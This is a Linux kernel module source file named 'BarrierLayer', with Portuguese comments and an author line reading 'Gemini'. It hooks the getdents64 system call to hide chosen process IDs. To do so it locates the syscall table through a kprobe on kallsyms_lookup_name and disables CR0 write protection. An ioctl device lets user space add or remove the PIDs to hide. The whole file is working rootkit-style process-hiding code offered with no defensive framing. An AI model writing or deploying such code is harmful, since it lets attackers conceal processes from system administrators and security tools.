#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/kprobes.h> // Usaremos kprobes para encontrar kallsyms_lookup_name

#include "../src/include/barrierlayer.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gemini");
MODULE_DESCRIPTION("BarrierLayer Kernel Module for Process Hiding");

#define MAX_HIDDEN_PIDS 32

// --- Typedefs para ponteiros de função ---
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
    typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
#else
    // Definição legada para kernels mais antigos
    typedef asmlinkage long (*t_syscall)(unsigned int, const char __user *, unsigned int, unsigned int);
#endif

// --- Variáveis Globais ---
static unsigned long **sys_call_table;
static t_syscall orig_getdents64;
static int hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pids_count = 0;
static int major_number;

// --- Funções para manipulação da memória ---
static void disable_write_protection(void) {
    write_cr0(read_cr0() & (~0x10000));
}
static void enable_write_protection(void) {
    write_cr0(read_cr0() | 0x10000);
}

// --- O Hook: nossa versão da getdents64 ---
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    pr_info("BarrierLayer: [DEBUG] hooked_getdents64 CALLED!\n");

    long nread;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    nread = orig_getdents64(regs);
#else
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long nread;
    nread = orig_getdents64(fd, dirent, count);
#endif

    long bpos;
    struct linux_dirent64 *d;
    int i;

    if (nread <= 0) return nread;

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *)((char *)dirent + bpos);
        for (i = 0; i < hidden_pids_count; i++) {
            char pid_str[10];
            snprintf(pid_str, sizeof(pid_str), "%d", hidden_pids[i]);
            if (strcmp(d->d_name, pid_str) == 0) {
                pr_info("BarrierLayer: [DEBUG] Match found! Hiding PID %s\n", d->d_name);
                int reclen = d->d_reclen;
                int err = nread - (bpos + reclen);
                if (err > 0) {
                    memmove(d, (char *)d + reclen, err);
                }
                nread -= reclen;
                goto next_record; // Evita o incremento de bpos
            }
        }
        bpos += d->d_reclen;
    next_record:
        ;
    }
    return nread;
}

// --- Implementação do Dispositivo de Caractere (IOCTL) ---
static long barrierlayer_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    barrierlayer_ioctl_data data;
    int pid_to_manage, i, found;

    if (copy_from_user(&data, (barrierlayer_ioctl_data __user *)arg, sizeof(data))) return -EFAULT;

    pid_to_manage = data.pid;

    switch (cmd) {
        case BL_IOCTL_HIDE_PID:
            if (hidden_pids_count < MAX_HIDDEN_PIDS) {
                pr_info("BarrierLayer: Hiding PID %d\n", pid_to_manage);
                hidden_pids[hidden_pids_count++] = pid_to_manage;
            } else {
                pr_warn("BarrierLayer: Max hidden PIDs reached\n");
                return -ENOMEM;
            }
            break;
        case BL_IOCTL_UNHIDE_PID:
            pr_info("BarrierLayer: Unhiding PID %d\n", pid_to_manage);
            found = 0;
            for (i = 0; i < hidden_pids_count; i++) {
                if (hidden_pids[i] == pid_to_manage) {
                    hidden_pids[i] = hidden_pids[hidden_pids_count - 1];
                    hidden_pids_count--;
                    found = 1;
                    break;
                }
            }
            if (!found) return -EINVAL;
            break;
        default:
            return -ENOTTY;
    }
    return 0;
}

static struct file_operations fops = { .unlocked_ioctl = barrierlayer_ioctl };

// --- Inicialização e Saída do Módulo ---
static int __init barrierlayer_init(void) {
    kallsyms_lookup_name_t kallsyms_lookup_name;
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

    pr_info("BarrierLayer: Initializing Kernel Module...\n");

    // Usa kprobe para obter o endereço de kallsyms_lookup_name
    if (register_kprobe(&kp) < 0) {
        pr_err("BarrierLayer: kprobe registration failed for kallsyms_lookup_name\n");
        return -EFAULT;
    }
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        pr_err("BarrierLayer: sys_call_table not found!\n");
        return -ENOSYS;
    }
    pr_info("BarrierLayer: sys_call_table found at %p\n", sys_call_table);

    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0) {
        pr_err("BarrierLayer: Failed to register a major number\n");
        return major_number;
    }
    pr_info("BarrierLayer: Registered correctly with major number %d\n", major_number);

    orig_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    enable_write_protection();

    pr_info("BarrierLayer: [DEBUG] Value after hook attempt: %p, expecting %p\n", sys_call_table[__NR_getdents64], hooked_getdents64);

    pr_info("BarrierLayer: Hooked getdents64 successfully.\n");
    pr_info("BarrierLayer: Module loaded.\n");
    return 0;
}

static void __exit barrierlayer_exit(void) {
    if (sys_call_table && orig_getdents64) {
        disable_write_protection();
        sys_call_table[__NR_getdents64] = (unsigned long *)orig_getdents64;
        enable_write_protection();
        pr_info("BarrierLayer: Unhooked getdents64.\n");
    }
    unregister_chrdev(major_number, DEVICE_NAME);
    pr_info("BarrierLayer: Module unloaded.\n");
}

module_init(barrierlayer_init);
module_exit(barrierlayer_exit);